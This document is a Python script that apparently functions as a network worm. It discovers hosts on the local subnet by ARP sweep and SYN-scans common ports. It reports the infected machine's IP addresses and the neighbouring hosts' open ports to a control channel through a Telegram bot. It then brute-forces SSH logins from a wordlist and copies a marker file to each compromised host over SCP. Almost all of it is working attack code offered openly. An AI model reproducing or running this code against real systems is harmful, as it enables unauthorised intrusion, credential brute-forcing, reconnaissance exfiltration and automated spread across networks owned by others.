import json
import requests
import paramiko
import scp as sc
import multiprocessing as mp
import netifaces
import ipcalc
import netaddr
import sys
from scapy.all import *

import time as t

"""
PROPAGATION
"""
def propagate(host,port,username,password):
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	ssh.connect(host,port,username,password)
	scp = sc.SCPClient(ssh.get_transport())
	scp.put("owned.txt","~/")
	scp.close()
	ssh.close()

"""
SSH BRUTE FORCE
"""
def connection_established(host,port,username,password):
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	try:
		ssh.connect(host,port,username,password)
		ssh.close()
		return True
	except:
		ssh.close()
		return False

def ssh_brute_force(host,port):

	creds_file = open("credentials.txt","r")
	cred_list = creds_file.read().split("\n")
	creds_file.close()
	cred_list = [creds.split(",") for creds in cred_list if creds]
	
	for index in range(0,len(cred_list)):
		cred_list[index].insert(0,port)
		cred_list[index].insert(0,host)
		
	pool = mp.Pool()
	results = pool.starmap(connection_established,cred_list)

	if True in results:
		credentials = cred_list[results.index(True)]  
	else: 
		credentials ="password not in the wordlist"

	return credentials

	
"""
PORT SCAN
"""
def scan(target_ip):
	
	open_ports = []
	
	for port in  [20,21,22,23,25,53,80,443,5900,8080]:
		tcp = TCP(sport=2525,dport=port,flags="S")
		ip = IP(dst=target_ip)
		SYN = ip/tcp
		SYNACK = sr1(SYN,verbose=0,timeout=2,retry=2)
		if SYNACK and 'R' not in SYNACK[TCP].flags:
			open_ports.append(port)
			
	return [target_ip,open_ports]

def port_scan(network):

	targets = [elem[0] for elem in network]
	pool = mp.Pool()
	results = pool.map(scan,targets)
	results = [elem for elem in results if elem[1]]
	return results
	
	
"""
NETWORK DISCOVERY
"""
def send_arp(ip_address):
	arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address)
	response = srp1(arp_packet,verbose=False,timeout=0.5,retry=2)
	if response: return [ip_address,response[ARP].hwsrc]
	else: return 0
		
def discover_network(subnet):
	pool = mp.Pool()
	results = pool.map(send_arp,subnet)
	results = [elem for elem in results if elem != 0]
	return results

def calculate_subnet(host,netmask,gateway,broadcast):
	cidr = str(netaddr.IPAddress(netmask).netmask_bits())
	subnet = ipcalc.Network(host+"/"+ cidr)
	subnet = [str(ip) for ip in subnet if str(ip) != gateway and \
					       str(ip) != broadcast and \
					       str(ip) != host]
	return subnet
	
"""
SEND FEEDBACK TO CONTROL SERVER
"""
def send_feedback(token,chat_id,host_ip,netmask,broadcast,gateway,devices_open_ports):
	
	public_ip = requests.get("https://api.ipify.org").text
	
	status = "Infected host and its network informations:\n" + \
		 "host public ip: " + public_ip + "\n" + \
		 "host private ip: " + host_ip + "\n" + \
		 "netmask: " + netmask + "\n" + \
		 "broadcast: " + broadcast + "\n" + \
		 "gateway: " + gateway + "\n\n"	 

	if not devices_open_ports:
		status += "All devices have no well known ports open!\n"
	else:
		status += "Network I'm in:\n"
		for elem in devices_open_ports:
			status += "ip: " + elem[0] + " open ports: " + str(elem[1]) + "\n"

	post_req = requests.post("https://api.telegram.org/bot"+token+ \
				  "/sendMessage",data={"chat_id":chat_id,"text":status})
				  
"""
DETERMINE WICH INTERFACE I'M USING
"""
def determine_if():
	interfaces = netifaces.interfaces()
	interfaces = [elem for elem in interfaces if elem != 'lo']
	
	online_interfaces = []
	
	for interface in interfaces:
		if netifaces.AF_INET in netifaces.ifaddresses(interface).keys():
			online_interfaces.append(interface)
	
	if not online_interfaces: return 0
	else: return online_interfaces[0]

if __name__ == "__main__":

	start = t.time()
	
	### CHECK IF ONLINE ###
	interface = determine_if()
	if interface == 0 : sys.exit("Not online")

	### NETWORK DISCOVERY ###
	info = netifaces.ifaddresses(interface)[netifaces.AF_INET]
	host_ip = info[0]['addr']
	netmask = info[0]['netmask']
	gateway = netifaces.gateways()[netifaces.AF_INET][0][0]
	broadcast = info[0]['broadcast']
	
	subnet = calculate_subnet(host_ip,netmask,gateway,broadcast)
	
	network = discover_network(subnet)
	
	### PORT SCAN OF EACH DEVICE ON THE NETWORK ###
	devices_open_ports = port_scan(network)
	
	### CONFIG ###
	con_file = open("config.json","r")
	config = json.load(con_file)
	con_file.close()

	### SENDING THE INFORMATION TO THE CONTROL SERVER ###
	send_feedback(config["http_token"],config["chat_id"],host_ip,netmask,broadcast,gateway,devices_open_ports)
	
	### SSH BRUTE FORCE ###
	ssh_targets = [elem[0] for elem in devices_open_ports if 22 in elem[1]]
	for target_ip in ssh_targets:
		credentials = [ssh_brute_force(target_ip,22)]
		
	### AUTO PROPAGATION ###
	for target in credentials:
		propagate(target[0],target[1],target[2],target[3])
		
	print("script took %s seconds to complete"%(t.time()-start))
